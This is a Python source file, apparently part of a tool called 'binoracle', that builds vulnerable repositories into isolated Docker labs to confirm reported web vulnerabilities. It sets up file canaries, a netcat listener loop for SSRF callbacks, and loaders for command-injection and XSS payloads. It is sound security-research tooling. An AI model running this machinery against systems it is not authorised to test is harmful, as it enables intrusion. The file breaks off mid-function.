"""Verificacion dinamica CMS-AGNOSTICA: cuando el objetivo no es WordPress/Drupal/Joomla (un
repo cualquiera), binoracle no se rinde -- si trae su PROPIO Dockerfile/docker-compose.yml, lo
construye y arranca tal cual; si NO trae ninguno, intenta reconocer el stack por sus propios
ficheros (package.json/requirements.txt/composer.json/*.php, ver _detect_and_write_auto_dockerfile)
y genera un Dockerfile minimo propio para arrancarlo -- deliberadamente acotado a un numero
pequeno de stacks comunes, nunca una garantia de arrancar CUALQUIER repo. En ambos casos, en una
red/entorno aislado propio, y verifica contra el contenedor real resultante, con la misma
disciplina de prueba dura (nunca `verified=True` por un codigo de estado, siempre por una
confirmacion independiente) que wpverify.py/drupalverify.py/joomlaverify.py.

Esto es deliberadamente mas limitado que los verificadores CMS-especificos: no hay login/sesion
de por medio (no hay un flujo de autenticacion generico que valga para cualquier stack), asi que
solo cubre clases de vulnerabilidad que no lo necesitan -- de momento, command injection via un
canario de fichero (igual de valido en Python/Node/Go/PHP/Java: todos escriben a disco igual) --
y se amplia poco a poco."""
from __future__ import annotations

import json
import os
import re
import subprocess
import time
from typing import Callable, List, Optional

from .wpverify import (WpVerifyResult, _ALPINE_IMAGE, _FILE_UPLOAD_HINTS, _ID_HINTS, _PATH_HINTS,
                       _REDIRECT_HINTS, _SQLI_HINTS, _URL_HINTS, _XML_HINTS, _XSS_HINTS,
                       _XssBrowserSession, _docker_daemon_ok, _http_request,
                       _http_request_raw_path, _lab_host,
                       _pick_param, _redirect_location_is_external, _run, _screenshot_response,
                       _screenshot_terminal_step,
                       _token, configure_burp_mcp)  # noqa: F401 -- reexportado a proposito, ver abajo
from .payload_kb import (load_command_injection_separators, load_open_redirect_templates,
                         load_ssti_arithmetic_payloads, load_xss_payloads)
import secrets

_COMPOSE_NAMES = ("docker-compose.yml", "docker-compose.yaml", "compose.yml", "compose.yaml")


# configure_burp_mcp/_http_request/_screenshot_response viven en wpverify.py (ver ahi) -- UN SOLO estado compartido
# por TODOS los verificadores (genericos y CMS-especificos), no una copia por modulo. Se
# reexportan aqui (import de arriba) para no romper el `from .genericverify import
# configure_burp_mcp` que cli.py/web.py ya usaban.

_CI_HINTS = ("cmd", "command", "exec", "run", "host", "ip", "address", "target", "ping",
             "domain", "url", "path", "file", "name", "query", "search", "input")


_AUTO_DOCKERFILE_NAME = ".binoracle_auto_Dockerfile"


def _best_python_image() -> str:
    """Returns the best available Python base image.

    Prefers python:3.11-slim (Debian-based, full glibc) but falls back to
    python:3.11-alpine when slim is not in the local Docker cache AND a quick
    pull attempt fails with Docker Hub rate-limiting (HTTP 429).  Alpine needs
    build tools for C-extension wheels (aiohttp, cryptography, etc.); they are
    added via a RUN apk add line injected by _alpine_python_build_deps().
    """
    # Check local cache first (fast path, no network)
    r = subprocess.run(
        ["docker", "images", "-q", "python:3.11-slim"],
        capture_output=True, text=True, timeout=10,
    )
    if r.returncode == 0 and r.stdout.strip():
        return "python:3.11-slim"
    # Try a quick pull; if rate-limited use alpine (already cached from session warm-up)
    pull = subprocess.run(
        ["docker", "pull", "python:3.11-slim"],
        capture_output=True, text=True, timeout=60,
    )
    if pull.returncode == 0:
        return "python:3.11-slim"
    combined = (pull.stdout or "") + (pull.stderr or "")
    if "429" in combined or "toomanyrequests" in combined.lower():
        return "python:3.11-alpine"
    return "python:3.11-slim"


def _alpine_python_build_deps() -> str:
    """Extra RUN step to install C build tools on Alpine Python images.

    Required for packages with C extensions (aiohttp, cryptography, lxml…).
    No-op on Debian/slim images (never inserted there).
    """
    return "RUN apk add --no-cache gcc musl-dev libffi-dev openssl-dev linux-headers"


# deteccion de stack cuando el repo NO trae su propio Dockerfile/compose -- deliberadamente
# acotada a los 3 casos mas comunes en PoCs publicos de CVEs web (Node/Python/PHP puro, sin
# framework que exija su propio arranque especial como Django/Rails). Cada entrada: (fichero que
# delata el stack, lineas del Dockerfile generado, puerto por defecto que se expone). Generalizar
# a CUALQUIER stack sin acotar la lista seria adivinar a ciegas -- mejor una lista corta y
# honesta que crece con casos reales confirmados, que una que finja cubrirlo todo.
def _build_stack_signals() -> tuple:
    """Build stack signals with dynamic Python base image selection."""
    py_image = _best_python_image()
    py_run_lines: list = ["WORKDIR /app", "COPY . ."]
    if "alpine" in py_image:
        py_run_lines.append(_alpine_python_build_deps())
    py_run_lines += [
        "RUN pip install --no-cache-dir -r requirements.txt || true",
        'CMD ["sh", "-c", "python app.py || python main.py || python manage.py runserver 0.0.0.0:5000"]',
    ]
    return (
        ("package.json", "node:20-alpine", 3000,
         ["WORKDIR /app", "COPY . .", "RUN npm install || npm install --legacy-peer-deps || true",
          'CMD ["sh", "-c", "npm start || node index.js || node app.js || node server.js"]']),
        # Ruby/Rack: se chequea antes que requirements.txt porque "rack" coincide con el patron pip
        ("Gemfile", "ruby:3.1-slim", 9292,
         ["WORKDIR /app", "COPY . .",
          "RUN gem install bundler --no-document && bundle install --retry 5 "
          "|| gem install rack rackup webrick && bundle install --retry 3 || true",
          'CMD ["bundle", "exec", "rackup", "--host", "0.0.0.0", "--port", "9292", "config.ru"]']),
        ("requirements.txt", py_image, 5000, py_run_lines),
        ("composer.json", "php:8.2-cli", 8000,
         ["WORKDIR /app", "COPY . .",
          "RUN (command -v composer >/dev/null && composer install --no-interaction || true)",
          'CMD ["php", "-S", "0.0.0.0:8000", "-t", "."]']),
    )


_STACK_SIGNALS = _build_stack_signals()
# PHP sin composer.json (scripts sueltos, el caso mas comun en un PoC de un solo plugin/script
# vulnerable): activa el servidor de desarrollo embebido de PHP, sirve cualquier .php del repo
# tal cual, sin necesitar entender el proyecto.
_PHP_BARE_DOCKERFILE = ["WORKDIR /app", "COPY . .",
                       'CMD ["php", "-S", "0.0.0.0:8000", "-t", "."]']


def _detect_bare_flask_entry(source_dir: str) -> Optional[str]:
    """Busca un script Flask SUELTO (sin requirements.txt -- el caso real confirmado en vivo con
    CVE-2025-57633/FTP-Flask-python: un PoC de un solo fichero, `import flask`/`from flask
    import`, sin manifest de dependencias de ningun tipo). Devuelve el nombre del MODULO (sin
    '.py', para FLASK_APP) del primer candidato encontrado a <=2 niveles de profundidad, o None.
    Un simple `python <script>.py` no basta aqui: un PoC de un solo fichero casi siempre trae su
    propio `if __name__ == '__main__': app.run(...)` SIN `host='0.0.0.0'` (el default de Flask
    es 127.0.0.1) -- confirmado en vivo exactamente con ese CVE: el contenedor arrancaba bien,
    pero el mapeo de puertos de Docker nunca podia alcanzarlo (conexion rechazada/reseteada
    desde fuera, con o sin inyeccion real). `flask run --host=0.0.0.0` (ver el Dockerfile que
    construye esta deteccion) IGNORA ese `app.run()` hardcodeado por completo -- usa su propio
    servidor de desarrollo, nunca ejecuta el bloque `__main__` -- en vez de intentar parchear el
    binding del script del autor del PoC."""
    candidates = []
    for root, dirs, files in os.walk(source_dir):
        depth = root[len(source_dir):].count(os.sep)
        if depth > 2:
            dirs[:] = []
            continue
        for fn in files:
            if not fn.lower().endswith(".py"):
                continue
            path = os.path.join(root, fn)
            try:
                with open(path, "r", errors="ignore") as f:
                    head = f.read(4096)
            except OSError:
                continue
            if re.search(r"^\s*(from flask import|import flask)\b", head, re.MULTILINE):
                rel = os.path.relpath(path, source_dir)
                candidates.append(rel[:-3].replace(os.sep, "."))   # quita '.py', path -> modulo
    return candidates[0] if candidates else None


def _package_json_has_runnable_entry(path: str) -> bool:
    """package.json por si solo NO basta como senal de 'esto es una app Node que se puede
    arrancar' -- un proyecto de OTRO stack puede traer uno solo para su pipeline de assets
    front-end (gulp/sass/webpack), sin ningun servidor Node real detras. Confirmado en vivo
    contra CVE-2026-9469 (StudentManagementSystem, PHP real): su package.json es el de la
    plantilla Bootstrap "SB Admin" (startbootstrap-sb-admin) -- solo dependencies/devDependencies
    de gulp/sass/jquery, SIN "main" NI "scripts" en absoluto -- y el orden de _STACK_SIGNALS
    (package.json antes que composer.json/PHP suelto) lo detectaba como stack Node por error,
    generando un Dockerfile que nunca llega a arrancar nada real (`npm start || node index.js
    || ...` -- ninguno existe) y dejando el PHP real (y por tanto la SQLi real) sin alcanzar
    nunca. Exige que declare como arrancarse de verdad: un "main" o un "scripts" no vacio (casi
    toda app Node real trae al menos uno de los dos) -- si no trae ninguno, no es senal de
    stack Node y se sigue probando el resto de _STACK_SIGNALS/deteccion PHP suelta."""
    try:
        import json
        with open(path, "r", errors="ignore") as f:
            data = json.load(f)
    except (OSError, ValueError):
        return False
    if not isinstance(data, dict):
        return False
    if data.get("main"):
        return True
    scripts = data.get("scripts")
    return bool(scripts) and isinstance(scripts, dict)


_PROXY_CA_FILENAME = ".binoracle_proxy_ca.crt"


def _proxy_dockerfile_lines(source_dir: str) -> List[str]:
    """Gap real encontrado en vivo investigando CVE-2025-57633 (FTP-Flask-python): el Dockerfile
    minimo auto-generado de arriba hace `RUN pip install flask` (o el equivalente npm/composer)
    dentro del `docker build`, pero un despliegue real de binoracle detras de un proxy saliente
    corporativo con re-terminacion TLS (exactamente la situacion de este propio sandbox de
    desarrollo) hace que ese paso falle con 'self-signed certificate in certificate chain' --
    el build nunca llega a arrancar nada, bloqueando CUALQUIER investigacion de un objetivo
    generico Python/Node/PHP sin Dockerfile propio, sin que sea un fallo real del objetivo.

    Cuando BINORACLE_DOCKER_BUILD_CA_CERT (ruta a un bundle CA) esta fijada, copia ese cert AL
    CONTEXTO de build (unico sitio desde el que un `COPY` del Dockerfile puede verlo) y devuelve
    las lineas a insertar justo despues del `FROM` -- antes de cualquier RUN de instalacion --
    para que pip/npm confien en el mismo proxy/CA que el resto de este proceso ya usa
    (HTTPS_PROXY se propaga via ARG/ENV, no solo al build sino tambien a los RUN posteriores).
    Vacio si la variable no esta fijada: ningun despliegue sin este proxy corporativo concreto
    se ve afectado."""
    ca_src = (os.environ.get("BINORACLE_DOCKER_BUILD_CA_CERT", "") or
              os.environ.get("SSL_CERT_FILE", ""))
    if not ca_src or not os.path.isfile(ca_src):
        return []
    try:
        import shutil as _shutil
        _shutil.copy(ca_src, os.path.join(source_dir, _PROXY_CA_FILENAME))
    except OSError:
        return []
    return [
        "ARG HTTPS_PROXY",
        "ENV HTTPS_PROXY=$HTTPS_PROXY",
        f"COPY {_PROXY_CA_FILENAME} /tmp/binoracle-ca.crt",
        "ENV NODE_EXTRA_CA_CERTS=/tmp/binoracle-ca.crt PIP_CERT=/tmp/binoracle-ca.crt "
        "NPM_CONFIG_CAFILE=/tmp/binoracle-ca.crt "
        "SSL_CERT_FILE=/tmp/binoracle-ca.crt BUNDLE_SSL_CA_CERT=/tmp/binoracle-ca.crt",
    ]


def _detect_cms_fingerprint(source_dir: str) -> Optional[str]:
    """Devuelve el nombre del CMS si se detecta en source_dir, o None.

    Los CMSs de Node.js (Ghost, Strapi, Payload) tienen manifiestos específicos que
    permiten un Dockerfile más preciso que el genérico 'npm start'. Craft CMS y otros
    CMSs PHP se manejan por la ruta composer.json normal.
    """
    pkg_path = os.path.join(source_dir, "package.json")
    if os.path.isfile(pkg_path):
        try:
            with open(pkg_path) as f:
                pkg = json.load(f)
            name = (pkg.get("name") or "").lower()
            deps_all = {**pkg.get("dependencies", {}), **pkg.get("devDependencies", {})}
            # Ghost: package.json tiene name="ghost" o dep "ghost-core"/"@tryghost/..."
            if name == "ghost" or any(k.startswith("@tryghost/") for k in deps_all):
                return "ghost"
            # Strapi: dep "@strapi/strapi" o name contains "strapi"
            if "@strapi/strapi" in deps_all or "strapi" in deps_all or "strapi" in name:
                return "strapi"
            # Payload CMS: dep "payload"
            if "payload" in deps_all and "payload" in (pkg.get("description", "") + name).lower():
                return "payload"
        except (OSError, ValueError, KeyError):
            pass
    # Craft CMS: composer.json con craftcms/cms
    composer_path = os.path.join(source_dir, "composer.json")
    if os.path.isfile(composer_path):
        try:
            with open(composer_path) as f:
                comp = json.load(f)
            if "craftcms/cms" in comp.get("require", {}):
                return "craft"
        except (OSError, ValueError, KeyError):
            pass
    # Wagtail / Django CMS: requirements.txt con wagtail o django-cms
    req_path = os.path.join(source_dir, "requirements.txt")
    if os.path.isfile(req_path):
        try:
            content = open(req_path).read().lower()
            if "wagtail" in content:
                return "wagtail"
            if "django-cms" in content or "djangocms" in content:
                return "djangocms"
        except OSError:
            pass
    return None


def _cms_dockerfile_lines(cms: str, source_dir: str) -> Optional[tuple]:
    """Devuelve (base_image, port, run_lines) para un CMS conocido, o None.

    Los Dockerfiles generados aquí usan variables de entorno de desarrollo mínimas
    que permiten arrancar el CMS sin configuración real: SQLite in-memory / fichero
    .tmp, secrets dummy, NODE_ENV=development. Esto basta para explorar las rutas
    vulnerables sin persistencia real.
    """
    proxy = _proxy_dockerfile_lines(source_dir)
    if cms == "ghost":
        # Ghost >=5: 'node current/index.js' o 'node_modules/.bin/ghost start'
        # Usamos imagen oficial que ya trae la instalación
        lines = (["WORKDIR /var/lib/ghost"] + proxy +
                 ["ENV NODE_ENV=development",
                  "ENV database__client=sqlite3",
                  "ENV database__connection__filename=/var/lib/ghost/content/data/ghost-dev.db",
                  "ENV url=http://localhost:2368",
                  "RUN npm install --prefix /var/lib/ghost || true",
                  'CMD ["node", "current/index.js"]'])
        return ("ghost:5-alpine", 2368, lines)

    if cms == "strapi":
        lines = (["WORKDIR /app", "COPY . ."] + proxy +
                 ["ENV NODE_ENV=development",
                  "ENV DATABASE_CLIENT=sqlite",
                  "ENV DATABASE_FILENAME=.tmp/data.db",
                  "ENV JWT_SECRET=binoracle_dev_jwt_secret_32ch",
                  "ENV ADMIN_JWT_SECRET=binoracle_dev_admin_jwt_32ch",
                  "ENV APP_KEYS=binoracle_key1,binoracle_key2",
                  "ENV API_TOKEN_SALT=binoracle_api_token_salt_xx",
                  "RUN npm install || npm install --legacy-peer-deps || true",
                  "RUN npm run build -- --no-optimization 2>/dev/null || true",
                  'CMD ["npm", "run", "develop"]'])
        return ("node:18-alpine", 1337, lines)

    if cms == "payload":
        lines = (["WORKDIR /app", "COPY . ."] + proxy +
                 ["ENV NODE_ENV=development",
                  "ENV PAYLOAD_SECRET=binoracle_payload_secret_32ch",
                  "ENV DATABASE_URI=file:/app/.tmp/payload-dev.db",
                  "ENV MONGODB_URI=",
                  "RUN npm install || npm install --legacy-peer-deps || true",
                  'CMD ["sh", "-c", "npm run dev || npm start || node dist/server.js || node src/server.js"]'])
        return ("node:18-alpine", 3000, lines)

    if cms == "wagtail":
        _py = _best_python_image()
        _extra = (["RUN " + _alpine_python_build_deps().split("RUN ", 1)[1]]
                  if "alpine" in _py else [])
        lines = (["WORKDIR /app", "COPY . ."] + proxy + _extra +
                 ["RUN pip install --no-cache-dir -r requirements.txt || true",
                  "ENV DJANGO_SETTINGS_MODULE=mysite.settings.dev",
                  "RUN python manage.py migrate --run-syncdb 2>/dev/null || true",
                  'CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]'])
        return (_py, 8000, lines)

    if cms == "djangocms":
        _py = _best_python_image()
        _extra = (["RUN " + _alpine_python_build_deps().split("RUN ", 1)[1]]
                  if "alpine" in _py else [])
        lines = (["WORKDIR /app", "COPY . ."] + proxy + _extra +
                 ["RUN pip install --no-cache-dir -r requirements.txt || true",
                  "RUN python manage.py migrate --run-syncdb 2>/dev/null || true",
                  'CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]'])
        return (_py, 8000, lines)

    return None


def _detect_and_write_auto_dockerfile(source_dir: str) -> Optional[dict]:
    """Cuando el repo NO trae su propio Dockerfile/docker-compose.yml, detecta el stack por sus
    ficheros delatores (package.json/requirements.txt/composer.json, o sueltos .php) y ESCRIBE
    un Dockerfile minimo propio para arrancarlo -- deliberadamente acotado a Node/Ruby/Python/PHP sin
    framework (los casos mas comunes en PoCs publicos), no un intento de adivinar cualquier
    stack posible. El Dockerfile generado queda guardado en el propio directorio del codigo
    (_AUTO_DOCKERFILE_NAME) para que quede constancia de que NO es el del autor del PoC -- el
    `step()` del caller debe dejarlo igual de explicito en el informe."""
    # Deteccion de CMS conocido primero (Ghost, Strapi, Payload, Wagtail...)
    cms = _detect_cms_fingerprint(source_dir)
    if cms:
        cms_tup = _cms_dockerfile_lines(cms, source_dir)
        if cms_tup:
            base_image, port, cms_lines = cms_tup
            lines = [f"FROM {base_image}"] + cms_lines + [f"EXPOSE {port}"]
            path = os.path.join(source_dir, _AUTO_DOCKERFILE_NAME)
            with open(path, "w") as f:
                f.write("\n".join(lines) + "\n")
            return {"kind": "dockerfile", "path": path, "context": source_dir,
                    "auto_generado": True, "stack_detectado": f"CMS:{cms}",
                    "cms": cms}

    for signal_file, base_image, port, run_lines in _STACK_SIGNALS:
        signal_path = os.path.join(source_dir, signal_file)
        if not os.path.isfile(signal_path):
            continue
        if signal_file == "package.json" and not _package_json_has_runnable_entry(signal_path):
            continue
        lines = [f"FROM {base_image}"] + _proxy_dockerfile_lines(source_dir) + run_lines + [f"EXPOSE {port}"]
        path = os.path.join(source_dir, _AUTO_DOCKERFILE_NAME)
        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")
        return {"kind": "dockerfile", "path": path, "context": source_dir,
               "auto_generado": True, "stack_detectado": signal_file}
    flask_module = _detect_bare_flask_entry(source_dir)
    if flask_module:
        _py_img = _best_python_image()
        _flask_pip = (["RUN " + _alpine_python_build_deps().split("RUN ", 1)[1]]
                      if "alpine" in _py_img else [])
        lines = ([f"FROM {_py_img}"] + _proxy_dockerfile_lines(source_dir) +
                ["WORKDIR /app", "COPY . ."] + _flask_pip +
                ["RUN pip install --no-cache-dir flask",
                 f"ENV FLASK_APP={flask_module}",
                 'CMD ["python", "-m", "flask", "run", "--host=0.0.0.0", "--port=5000"]',
                 "EXPOSE 5000"])
        path = os.path.join(source_dir, _AUTO_DOCKERFILE_NAME)
        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")
        return {"kind": "dockerfile", "path": path, "context": source_dir,
               "auto_generado": True, "stack_detectado": f"*.py (Flask suelto: {flask_module})"}
    has_bare_php = any(fn.lower().endswith(".php")
                      for fn in os.listdir(source_dir) if os.path.isfile(os.path.join(source_dir, fn)))
    if not has_bare_php:
        for root, dirs, files in os.walk(source_dir):
            depth = root[len(source_dir):].count(os.sep)
            if depth > 2:
                dirs[:] = []
                continue
            if any(fn.lower().endswith(".php") for fn in files):
                has_bare_php = True
                break
    if has_bare_php:
        lines = (["FROM php:8.2-cli"] + _proxy_dockerfile_lines(source_dir) +
                _PHP_BARE_DOCKERFILE + ["EXPOSE 8000"])
        path = os.path.join(source_dir, _AUTO_DOCKERFILE_NAME)
        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")
        return {"kind": "dockerfile", "path": path, "context": source_dir,
               "auto_generado": True, "stack_detectado": "*.php (sin composer.json)"}
    return None


def _find_build_target(source_dir: str) -> Optional[dict]:
    """Busca, en el codigo YA descargado, como arrancar el objetivo -- un docker-compose.yml/
    compose.yml (en la raiz o un nivel por debajo, el sitio donde casi todo el mundo lo pone), o
    si no hay, un Dockerfile suelto. Si NINGUNO de los dos existe, intenta detectar el stack por
    sus propios ficheros (package.json/requirements.txt/composer.json/*.php) y generar un
    Dockerfile minimo propio (ver _detect_and_write_auto_dockerfile) -- deliberadamente acotado a
    un numero pequeno de stacks comunes, nunca una garantia de arrancar CUALQUIER repo. Devuelve
    None solo si nada de esto aplica."""
    for root, dirs, files in os.walk(source_dir):
        depth = root[len(source_dir):].count(os.sep)
        if depth > 2:
            dirs[:] = []
            continue
        for name in _COMPOSE_NAMES:
            if name in files:
                return {"kind": "compose", "path": os.path.join(root, name), "context": root}
    for root, dirs, files in os.walk(source_dir):
        depth = root[len(source_dir):].count(os.sep)
        if depth > 2:
            dirs[:] = []
            continue
        if "Dockerfile" in files:
            return {"kind": "dockerfile", "path": os.path.join(root, "Dockerfile"), "context": root}
    return _detect_and_write_auto_dockerfile(source_dir)


def _exposed_ports_from_dockerfile(path: str) -> List[int]:
    ports: List[int] = []
    try:
        with open(path, "r", errors="ignore") as f:
            for line in f:
                m = re.match(r"\s*EXPOSE\s+([0-9 ]+)", line, re.IGNORECASE)
                if m:
                    ports.extend(int(p) for p in m.group(1).split() if p.isdigit())
    except OSError:
        pass
    return ports


# puertos comunes para cuando el Dockerfile no declara EXPOSE (pasa mas de lo que parece) -- los
# que de verdad usan por defecto Flask/Django/Express/Rails/Spring/ASP.NET/PHP-FPM+nginx/etc.
_COMMON_PORTS = [80, 8080, 3000, 5000, 8000, 4000, 8888, 9000, 4200, 1337]


class _GenericLab:
    """Analogo generico de _Lab (wpverify.py), pero el contenido del contenedor es el que trae
    el propio repo -- no hay imagen base fija ni sabemos de antemano el stack."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-genverify-{tag}"
        self.container = f"binoracle-genverify-{tag}-app"
        self.image = f"binoracle-genverify-{tag}:latest"
        self.compose_project = f"binoracle-genverify-{tag}"
        self.kind = ""
        self._created: List[str] = []

    def sh(self, *args, timeout=60.0, input_text=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text)

    def build_and_run(self, target: dict, timeout_build=600.0, timeout_run=60.0):
        self.kind = target["kind"]
        if self.kind == "dockerfile":
            # --network host (en el build en si, no solo en el contenedor final) + el proxy
            # saliente como --build-arg: el ENV HTTPS_PROXY que _proxy_dockerfile_lines() mete
            # en el Dockerfile no tiene efecto si el daemon de build no puede alcanzar siquiera
            # ese proxy -- ver _proxy_dockerfile_lines() para el porque completo. Sin
            # BINORACLE_DOCKER_BUILD_CA_CERT fijada, esto es un no-op (misma invocacion que
            # siempre, ningun despliegue sin este proxy concreto se ve afectado).
            proxy_build_args: List[str] = []
            _ca_cert = (os.environ.get("BINORACLE_DOCKER_BUILD_CA_CERT", "") or
                        os.environ.get("SSL_CERT_FILE", ""))
            if _ca_cert and os.path.isfile(_ca_cert):
                proxy_build_args = ["--network", "host", "--build-arg",
                                   f"HTTPS_PROXY={os.environ.get('HTTPS_PROXY', '')}"]
            # Retry on Docker Hub rate-limit (HTTP 429) with exponential backoff.
            # Caps at 3 attempts; on each retry we wait longer (60s, 120s) before rebuilding.
            _max_build_attempts = 3
            r = None
            for _attempt in range(_max_build_attempts):
                r = self.sh("build", "--platform", "linux/amd64", "-t", self.image,
                           *proxy_build_args, "-f", target["path"], target["context"],
                           timeout=timeout_build)
                if r.returncode == 0:
                    break
                combined = (r.stdout or "") + (r.stderr or "")
                if "429" in combined or "toomanyrequests" in combined.lower():
                    _wait = 60 * (2 ** _attempt)
                    if _attempt + 1 < _max_build_attempts:
                        time.sleep(_wait)
                        continue
                break
            if r.returncode != 0:
                return r
            self.sh("network", "create", self.net, timeout=30)
            self._created.append(("network", self.net))
            self._created.append(("image", self.image))
            r = self.sh("run", "-d", "--platform", "linux/amd64", "--name", self.container,
                       "--network", self.net, "-P", self.image, timeout=timeout_run)
            if r.returncode == 0:
                self._created.append(("container", self.container))
            return r
        else:
            env = dict(os.environ, COMPOSE_PROJECT_NAME=self.compose_project)
            r = subprocess.run(["docker", "compose", "-f", target["path"], "-p",
                                self.compose_project, "up", "-d", "--build"],
                               cwd=target["context"], env=env, capture_output=True, text=True,
                               timeout=timeout_build)
            self._created.append(("compose", target["path"]))
            return r

    def running_containers(self, timeout=15.0) -> List[str]:
        if self.kind == "dockerfile":
            return [self.container]
        r = self.sh("ps", "-a", "--filter", f"label=com.docker.compose.project={self.compose_project}",
                   "--format", "{{.Names}}", timeout=timeout)
        return [n for n in (r.stdout or "").splitlines() if n.strip()]

    def published_ports(self, container: str, timeout=15.0) -> List[str]:
        """Puertos del HOST publicados para `container` (sea `docker run -P` o los `ports:` del
        compose) -- `docker port` los lista sin tener que adivinar ni parsear YAML."""
        r = self.sh("port", container, timeout=timeout)
        ports = []
        for line in (r.stdout or "").splitlines():
            m = re.search(r":(\d+)\s*$", line.strip())
            if m:
                ports.append(m.group(1))
        return ports

    # Señales de "CMS realmente listo" en los logs del contenedor. Algunos CMSs responden
    # HTTP antes de haber terminado su inicialización (migraciones, primer arranque) lo que
    # genera falsos positivos en discover_http — las peticiones llegan a un app a medio boot.
    _CMS_READY_SIGNALS: dict = {
        "ghost":   ["Ghost is running in development", "Your site is accessible"],
        "strapi":  ["Project is fully loaded", "Project started"],
        "payload": ["Listening on port", "Server started"],
        "wagtail": ["Starting development server", "Quit the server"],
        "djangocms": ["Starting development server", "Quit the server"],
    }

    def discover_http(self, tries: int = 60, delay: float = 3.0,
                      cms: Optional[str] = None) -> Optional[tuple]:
        """Prueba TODOS los puertos publicados de TODOS los contenedores levantados hasta que uno
        responda HTTP (status < 500) -- sin asumir cual de los contenedores del compose es el
        servidor web ni en que puerto escucha. Devuelve (container, port) o None.

        urlopen() LANZA HTTPError para cualquier respuesta 4xx/5xx en vez de devolverla (solo los
        2xx/3xx llegan al `with` de abajo) -- confirmado en vivo que, sin capturarla aparte, un
        objetivo que solo expone rutas POST (su raiz responde 404/501, no 2xx) nunca se detectaba
        como 'listo' aunque estuviera arriba de verdad. Una URLError (sin respuesta HTTP en
        absoluto -- conexion rechazada, nombre no resuelto) si sigue significando 'aun no'.

        `cms`: cuando se conoce el CMS (detectado por _detect_cms_fingerprint), también espera
        una señal específica en los logs del contenedor que indica que la inicialización completó
        (p.ej. Ghost completa migraciones antes de emitir "Ghost is running in development") —
        evita falsos positivos donde HTTP responde pero la app aún está a medio arrancar.
        Los tries se aumentan automáticamente para CMSs pesados (Ghost, Strapi, Payload).
        """
        import urllib.error
        import urllib.request
        # CMSs con arranque largo: 90 tries × 3s = 4.5 min máximo
        heavy_cms = {"ghost", "strapi", "payload"}
        if cms and cms.lower() in heavy_cms and tries < 90:
            tries = 90
        ready_signals = self._CMS_READY_SIGNALS.get((cms or "").lower(), [])
        host = _lab_host()
        for _try in range(tries):
            # Para CMSs con señal conocida: verificar primero los logs antes de probar HTTP
            if ready_signals and _try > 0 and _try % 5 == 0:
                for c in self.running_containers():
                    logs_text = self.logs_tail(c, lines=50)
                    if any(sig.lower() in logs_text.lower() for sig in ready_signals):
                        # App lista según sus propios logs — ahora sí buscar puerto
                        ports = self.published_ports(c)
                        for port in ports:
                            try:
                                with urllib.request.urlopen(f"http://{host}:{port}/", timeout=5) as r:
                                    if r.status < 500:
                                        return (c, port)
                            except urllib.error.HTTPError as e:
                                if e.code < 500:
                                    return (c, port)
                            except Exception:
                                continue
            # Siempre intentar HTTP directamente (para apps sin señal específica)
            for c in self.running_containers():
                ports = self.published_ports(c)
                for port in ports:
                    try:
                        with urllib.request.urlopen(f"http://{host}:{port}/", timeout=4) as r:
                            if r.status < 500:
                                # Si hay señal de CMS: solo aceptar si ya aparece en logs
                                if ready_signals:
                                    logs_text = self.logs_tail(c, lines=30)
                                    if not any(sig.lower() in logs_text.lower() for sig in ready_signals):
                                        continue  # HTTP arriba pero CMS aún inicializando
                                return (c, port)
                    except urllib.error.HTTPError as e:
                        if e.code < 500:
                            if ready_signals:
                                logs_text = self.logs_tail(c, lines=30)
                                if not any(sig.lower() in logs_text.lower() for sig in ready_signals):
                                    continue
                            return (c, port)
                    except Exception:
                        continue
            time.sleep(delay)
        return None

    def logs_tail(self, name: str, lines: int = 80) -> str:
        try:
            r = self.sh("logs", "--tail", str(lines), name, timeout=15)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return f"(no se pudieron leer logs de {name}: {e})"

    def read_file(self, container: str, path: str, timeout=10.0) -> str:
        r = self.sh("exec", container, "sh", "-c", f"cat {path} 2>/dev/null", timeout=timeout)
        return r.stdout or ""

    def write_canary(self, container: str, path: str, content: str, timeout=15.0) -> bool:
        """Analogo de _Lab.write_canary (wpverify.py): planta un fichero DENTRO del contenedor
        real del objetivo (via `docker exec`, no en ningun volumen compartido -- aqui no sabemos
        de antemano si existe uno) para confirmar path-traversal/LFI de verdad."""
        r = self.sh("exec", "-i", container, "sh", "-c", f"cat > {path}",
                   input_text=content, timeout=timeout)
        return r.returncode == 0

    def resolve_network(self, timeout=15.0) -> Optional[str]:
        """Red Docker del laboratorio -- para `dockerfile` ya la creamos nosotros (self.net); para
        `compose`, docker compose crea la suya propia (convencion `<proyecto>_default`, pero no
        hay que confiar en la convencion: se busca por la etiqueta real que compose pone en toda
        red que crea)."""
        if self.kind == "dockerfile":
            return self.net
        r = self.sh("network", "ls", "--filter",
                   f"label=com.docker.compose.project={self.compose_project}",
                   "--format", "{{.Name}}", timeout=timeout)
        names = [n for n in (r.stdout or "").splitlines() if n.strip()]
        return names[0] if names else None

    def start_listener(self, timeout: float = 30.0) -> Optional[str]:
        """Analogo de _Lab.start_listener: un contenedor Alpine en la MISMA red del laboratorio
        que solo escucha TCP/8080 y vuelca cualquier conexion entrante -- sirve para confirmar
        SSRF generico igual que en WordPress: si el objetivo hace de verdad una peticion saliente
        hacia aqui, queda grabada con el token unico que iba en la ruta."""
        net = self.resolve_network(timeout=timeout)
        if not net:
            return None
        self.listener = f"binoracle-genverify-{self.tag}-ssrf"
        r = self.sh("run", "-d", "--name", self.listener, "--network", net, _ALPINE_IMAGE,
                   "sh", "-c", "while true; do nc -l -p 8080 >> /var/log/ssrf.log 2>&1; done",
                   timeout=timeout)
        if r.returncode != 0:
            return None
        self._created.append(("container", self.listener))
        return self.listener

    def listener_log(self, timeout: float = 10.0) -> str:
        r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
        return (r.stdout or "") if r.returncode == 0 else ""

    def container_ip(self, name: str, timeout: float = 10.0) -> Optional[str]:
        """IP interna real del contenedor `name` en la red del laboratorio -- para las variantes
        de SSRF que apuntan al listener por IP (decimal/hex/octal) en vez de por nombre."""
        net = self.resolve_network(timeout=timeout)
        if not net:
            return None
        r = self.sh("inspect", "-f",
                   f"{{{{(index .NetworkSettings.Networks \"{net}\").IPAddress}}}}",
                   name, timeout=timeout)
